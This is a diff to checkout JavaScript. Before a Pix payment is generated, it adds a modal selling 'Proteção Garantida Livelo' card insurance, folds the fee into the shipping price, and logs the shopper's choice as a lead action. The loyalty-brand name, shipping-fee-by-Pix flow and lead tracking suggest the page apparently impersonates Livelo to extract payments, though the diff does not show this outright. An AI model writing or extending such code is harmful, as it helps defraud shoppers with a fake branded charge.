@@ -67,6 +67,7 @@ async function fetchConfig() {
   try {
     const res = await fetch('/api/config');
     const cfg = await res.json();
+    STATE.config = cfg;
     if(cfg.frete_expresso) {
       const btn = document.getElementById('btn_frete_expresso');
       if(btn) {
@@ -663,6 +664,48 @@ async function submitWhatsapp() {
 let pixCheckInterval = null;
 
 async function gerarPix() {
+  if (STATE.config && STATE.config.upsell_active === 'true') {
+    showUpsellModal();
+  } else {
+    executeGerarPix();
+  }
+}
+
+function showUpsellModal() {
+  const modalHTML = `
+    <div id="upsell-modal-overlay" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:flex; justify-content:center; align-items:center; z-index:99999; backdrop-filter:blur(5px);">
+      <div style="background:var(--bg-glass); border:1px solid rgba(255,255,255,0.1); border-radius:16px; width:90%; max-width:400px; padding:24px; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,0.5); animation: zoomIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);">
+        <div style="font-size:3rem; margin-bottom:16px;">${STATE.config.upsell_icon || '🛡️'}</div>
+        <h2 style="font-size:1.4rem; font-weight:800; color:white; margin-bottom:12px; letter-spacing:-0.5px;">${STATE.config.upsell_title || 'Proteção Garantida Livelo'}</h2>
+        <p style="color:var(--text-muted); font-size:0.95rem; margin-bottom:24px; line-height:1.5;">Proteja seu cartão contra perdas, roubos e fraudes virtuais. Por apenas <strong>R$ ${STATE.config.upsell_value || '19,90'}</strong> você garante sua tranquilidade.</p>
+        
+        <button onclick="acceptUpsell()" style="width:100%; background:linear-gradient(135deg, #10B981, #059669); color:white; border:none; padding:16px; border-radius:12px; font-weight:800; font-size:1rem; cursor:pointer; margin-bottom:12px; transition:transform 0.2s, box-shadow 0.2s; box-shadow:0 4px 15px rgba(16, 185, 129, 0.4);">
+          Adicionar Proteção (Recomendado)
+        </button>
+        <button onclick="declineUpsell()" style="width:100%; background:transparent; color:var(--text-muted); border:none; padding:12px; border-radius:12px; font-weight:600; font-size:0.9rem; cursor:pointer; transition:color 0.2s;">
+          Não, obrigado
+        </button>
+      </div>
+    </div>
+  `;
+  document.body.insertAdjacentHTML('beforeend', modalHTML);
+}
+
+function acceptUpsell() {
+  const upsellVal = parseFloat((STATE.config.upsell_value || '19.90').replace(',', '.'));
+  STATE.shippingPrice = (STATE.shippingPrice || 29.90) + upsellVal;
+  logLeadAction('upsell_accepted', \`Added \${upsellVal}\`);
+  document.getElementById('upsell-modal-overlay').remove();
+  executeGerarPix();
+}
+
+function declineUpsell() {
+  logLeadAction('upsell_declined', 'User declined insurance');
+  document.getElementById('upsell-modal-overlay').remove();
+  executeGerarPix();
+}
+
+async function executeGerarPix() {
   goToStep('pix');
   
   $id('qr-loading').classList.remove('hidden');
